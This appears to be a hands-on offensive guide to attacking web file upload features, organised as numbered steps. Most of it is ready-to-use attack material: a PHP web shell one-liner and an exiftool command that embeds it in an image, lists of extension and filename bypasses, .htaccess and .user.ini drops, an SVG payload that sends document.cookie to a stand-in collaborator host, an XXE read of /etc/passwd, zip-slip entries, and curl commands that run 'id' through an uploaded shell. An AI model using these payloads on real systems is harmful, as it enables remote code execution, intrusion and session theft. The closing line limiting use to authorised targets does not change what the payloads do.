# HOW TO TEST FILE UPLOAD ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## Step 0 — Recon the upload surface
1. Login, locate every upload: **avatar, profile pic, cover, document, CSV/import, attachment, media library, signature, invoice, ZIP/theme/plugin import**.
2. Upload a benign file → note **storage path** and **URL pattern** (`/uploads/<id>`, `/uploads/2026/01/filename`, `/media/uuid`).
3. Observe **served Content-Type** of the uploaded file and whether a filename rewrite happened (sanitizer present? random name = harder traversal).

## Step 1 — Extension ladder (the #1 path to RCE)
Check filename against the **server-side extension** it actually executes — not the extension the UI shows.
```
shell.php        -> "Invalid type"?  (blocked = whitelist/blacklist exists)
shell.phtml      -> try
shell.php5       -> try
shell.phar       -> try
shell.pht        -> try
shell.php7       -> try
shell.php%00.png -> null byte (legacy PHP/Apache)
shell.php.       -> trailing dot (Windows Apache parse bug)
shell.php        -> trailing space
shell.pHp        -> case (case-insensitive filesystem / case-sensitive filter)
shell.php.jpg    -> double extension (filter strips last ext, Apache runs first)
shell.jpg.php    -> reverse double ext (filter checks first, Apache runs last)
shell.php.jpg.png-> allow-pass chain
shell.php::$DATA -> NTFS alternate data stream (Windows)
```
The **undeniable test**: does requesting the file *execute* it? `200 + code output = RCE`.

## Step 2 — MIME / magic-byte / polyglot
- If server checks **Content-Type only**: send `Content-Type: image/png` with a PHP body.
- If server checks **magic bytes only**: prepend a real signature then PHP tail:
  ```
  GIF89a;<?php system($_GET['c']); ?>
  \xff\xd8\xff\xe0 ... <?php ... ?>       (JPEG)
  \x89PNG\r\n\x1a\n ... <?php ... ?>      (PNG)
  ```
- **exiftool polyglot** (valid image with PHP in EXIF comment, then craft):
  ```
  exiftool -Comment='<?php system($_GET["c"]); ?>' evil.jpg
  ```
- If polyglot won't execute standalone, chain via **LFI** to include it.

## Step 3 — Config-file drop (silent RCE on writable parents)
Only if upload lands in a directory *above* or *equal to* where code runs:
```
.htaccess  ->  AddType application/x-httpd-php .png
.htaccess  ->  <FilesMatch ".*\.ph.*"> SetHandler php5-script </FilesMatch>
.user.ini  ->  auto_prepend_file = shell.png.png
```
Then upload `shell.png` containing PHP → include runs it.

## Step 4 — Filename → traversal / header / stored XSS
```
../../../../var/www/html/shell.php      (path traversal rename)
shell.php%0d%0aX-Injected: yes          (CRLF header injection in filename echo)
<script>alert(1)</script>.png           (stored XSS via filename reflection)
shell.php%252e.png                      (double-encoded dot)
shell.jpg;.php                          (semicolon — Windows/older .NET)
shell.php\t.txt                         (tab)
```
Watch response headers + JSON: a **rewritten filename** (dots encoded) = harder; **unchanged** = exploitable.

## Step 5 — Stored XSS / SVG
```
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//COLLABORATOR/?c='+document.cookie)">
<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://COLLABORATOR/x"/></svg>
```
SVG served as `image/svg+xml` but rendered in an `<img>` → still executes **on link via top-nav / viewer page**. SVG with `<image xlink:href>` = blind SSRF probe.

## Step 6 — XXE in SVG / OOXML / PDF
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd"/>
</svg>
```

## Step 7 — IDOR / access control on the uploaded file
- Enumerate `/uploads/12345`, `/files/uuid`, `/media/<id>`.
- If file URLs are guessable → **IDOR** (download others' private files).

## Step 8 — Zip-slip / zip-bomb (import/theme/zip endpoints)
- Zip-slip: entry named `../../../../tmp/evil.php` → extract writes outside the dir.
- Zip-bomb: highly-compressed file → decompression bomb on server extract.

## Confirm execution (never assume — PROVE it)
```
curl -i "https://target.com/uploads/shell.php?c=id" | grep -i "200\|x-powered-by"
GET /uploads/2026/01/shell.php?0=id
GET /wp-content/uploads/2026/01/shell.php?cmd=id
GET /upload/shell.php?c=id
```

## False positives (don't over-report)
- Upload succeeds but stored as `.txt` and served as `text/plain` → **no RCE**, still stored-content risk.
- Polyglot never executes (no LFI) → no RCE, may still be XSS/XXE.
- Filename fully sanitized to a random name → no traversal.
- `200` on a static fallthrough page ≠ execution — grep body for your echo.

## Worked mini-example (avatar upload)
```
curl -F "file=@shell.php;type=image/png" https://target.com/upload
# observe stored name + serve:
webshell.php -> served text? -> no PHP handler -> pivots:
  1) .htaccess drop, 2) LFI include, 3) SVG stored XSS instead.
```
Only run against authorized, in-scope targets.
